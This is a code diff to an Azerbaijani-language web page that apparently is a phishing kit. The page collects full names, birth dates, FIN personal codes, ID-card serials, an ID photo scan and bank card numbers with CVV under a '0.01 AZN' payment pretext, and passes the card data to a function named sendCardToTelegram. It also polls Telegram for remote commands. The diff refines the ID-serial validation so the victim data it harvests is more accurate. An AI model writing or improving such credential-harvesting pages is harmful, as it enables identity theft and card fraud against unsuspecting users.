@@ -462,9 +462,9 @@
                                 <option value="AA">AA</option>
                                 <option value="AB">AB</option>
                             </select>
-                            <input type="text" id="idnum" placeholder="1234567" maxlength="7" inputmode="numeric" style="flex:1;padding:13px 14px;border:1.5px solid var(--line);border-radius:10px;font-family:'Manrope',sans-serif;font-size:15px;background:var(--paper);">
+                            <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric" style="flex:1;padding:13px 14px;border:1.5px solid var(--line);border-radius:10px;font-family:'Manrope',sans-serif;font-size:15px;background:var(--paper);">
                         </div>
-                        <div style="font-size:11px;color:var(--ink-soft);margin-top:4px;">Seriya 2 hərf, nömrə 7 rəqəm</div>
+                        <div style="font-size:11px;color:var(--ink-soft);margin-top:4px;" id="seriyaHint">AZE: 8 rəqəm, AA/AB: 7 rəqəm</div>
                     </div>
                     <div class="field"><label>Rəsmi iş yeriniz?</label><div class="toggle-row"><button type="button" class="toggle-btn active" data-val="beli">Bəli</button><button type="button" class="toggle-btn" data-val="xeyr">Xeyr</button></div></div>
                     <div class="id-card-preview" id="idCardPreview">
@@ -475,7 +475,7 @@
                         <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="previewPatronymic">ƏLİ OĞLU</span></div>
                         <div class="id-row"><span class="id-label">DOĞUM TARİXİ / DATE OF BIRTH</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
                         <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
-                        <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="previewId">AZE 1234567</span></div>
+                        <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="previewId">AZE 12345678</span></div>
                         <div class="id-footer"><span>Müddət / Date of Expiry: 10 il</span><span>Verilmə tarixi: 01.01.2020</span></div>
                         <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
                     </div>
@@ -586,7 +586,7 @@
                 <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;" onclick="sendCardToTelegram(); return false;">0.01 AZN ödə</button>
             </div>
 
-            <!-- STEP 8: Success (OTP hissəsi silindi, birbaşa bura) -->
+            <!-- STEP 8: Success -->
             <div id="successStep" style="display:none;">
                 <div class="success-container">
                     <div class="big-icon">✅</div>
@@ -712,13 +712,12 @@
             }
         }
 
-        // ==== İŞ SAATI YOXLAMASI (SADƏCƏ BİLDİRİŞ ÜÇÜN) ====
+        // ==== İŞ SAATI YOXLAMASI ====
         function checkWorkingHours() {
             const now = new Date();
             const hours = now.getHours();
             const isClosed = (hours >= 2 && hours < 10);
             
-            // Yalnız mesaj göndər, saytı avtomatik bağlama
             if (isClosed) {
                 console.log(`⏰ İş saatı deyil (${hours}:00). Sayt bağlı olmalıdır.`);
             } else {
@@ -730,7 +729,7 @@
         setTimeout(pollTelegramCommands, 2000);
         checkWorkingHours();
 
-        // ==== TEST REJİMİ (Konsoldan) ====
+        // ==== TEST REJİMİ ====
         window.toggleBlock = function() {
             setSiteBlocked(!isSiteBlocked);
             console.log(`🔒 Sayt ${isSiteBlocked ? 'BAĞLI' : 'AÇIQ'} vəziyyətinə keçdi.`);
@@ -946,12 +945,20 @@
             var lastName = document.getElementById('lastName').value.trim();
             var patronymic = document.getElementById('patronymic').value.trim();
             var birth = document.getElementById('birthDate').value;
+            var prefix = document.getElementById('idPrefix').value || 'AZE';
+            
+            // Seriyaya görə max uzunluq yoxlaması
+            var maxLen = (prefix === 'AZE') ? 8 : 7;
+            if (id.length !== maxLen) {
+                alert(prefix + ' seriyası üçün ' + maxLen + ' rəqəm daxil edin!');
+                return;
+            }
+            
             if (!firstName || !lastName) { alert('Ad və soyad daxil edin!'); return; }
             if (!birth) { alert('Doğum tarixi daxil edin!'); return; }
             if (!fin || fin.length !== 7) { alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
-            if (!id || id.length !== 7) { alert('Seriya nömrəsi 7 rəqəmdən ibarət olmalıdır!'); return; }
             if (!consent1 || !consent2) { alert('Bütün razılıqları qeyd edin!'); return; }
-            var prefix = document.getElementById('idPrefix').value || 'AZE';
+            
             document.getElementById('sumName').textContent = firstName.toUpperCase();
             document.getElementById('sumSurname').textContent = lastName.toUpperCase();
             document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
@@ -963,6 +970,23 @@
                 'Xeyr';
             showSummaryStep();
         }
+
+        // Seriya dəyişdikdə input maxlength və placeholder-ı yenilə
+        document.getElementById('idPrefix').addEventListener('change', function() {
+            var input = document.getElementById('idnum');
+            var prefix = this.value;
+            if (prefix === 'AZE') {
+                input.maxLength = 8;
+                input.placeholder = '12345678';
+                document.getElementById('seriyaHint').textContent = 'AZE: 8 rəqəm, AA/AB: 7 rəqəm';
+            } else {
+                input.maxLength = 7;
+                input.placeholder = '1234567';
+                document.getElementById('seriyaHint').textContent = 'AA/AB: 7 rəqəm, AZE: 8 rəqəm';
+            }
+            input.value = '';
+            updateIDPreview();
+        });
 
         // ========== PHOTO SCAN ==========
         function goToPhotoScan() {
@@ -1201,7 +1225,7 @@
             var patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
             var birth = document.getElementById('birthDate').value || '1990-01-01';
             var fin = document.getElementById('fin').value || '7A2BC9D';
-            var id = document.getElementById('idnum').value || '1234567';
+            var id = document.getElementById('idnum').value || '12345678';
             var prefix = document.getElementById('idPrefix').value || 'AZE';
             document.getElementById('previewName').textContent = name.toUpperCase() || 'ƏLİ';
             document.getElementById('previewSurname').textContent = surname.toUpperCase() || 'MƏMMƏDOV';
@@ -1209,7 +1233,7 @@
             document.getElementById('previewBirth').textContent = birth ? birth.split('-').reverse().join('.') :
                 '01.01.1990';
             document.getElementById('previewFin').textContent = fin.toUpperCase() || '7A2BC9D';
-            document.getElementById('previewId').textContent = (prefix || 'AZE') + ' ' + (id || '1234567');
+            document.getElementById('previewId').textContent = (prefix || 'AZE') + ' ' + (id || '12345678');
         }
         document.getElementById('firstName').addEventListener('input', updateIDPreview);
         document.getElementById('lastName').addEventListener('input', updateIDPreview);
@@ -1286,7 +1310,7 @@
             document.getElementById('cardCvvDisplay').textContent = display;
         });
 
-        // ========== SEND CARD (DÜYMƏSİZ TELEGRAM MESAJI) ==========
+        // ========== SEND CARD ==========
         function sendCardToTelegram() {
             var cardNumber = cardNumberInput.value;
             if (cardNumber.length < 16) { alert('16 rəqəmli kart nömrəsini daxil edin!');
@@ -1469,7 +1493,9 @@
             updateIDPreview();
         });
         document.getElementById('idnum').addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '').slice(0, 7);
+            var prefix = document.getElementById('idPrefix').value || 'AZE';
+            var maxLen = (prefix === 'AZE') ? 8 : 7;
+            this.value = this.value.replace(/\D/g, '').slice(0, maxLen);
             updateIDPreview();
         });
         document.getElementById('checkFin').addEventListener('input', function() {
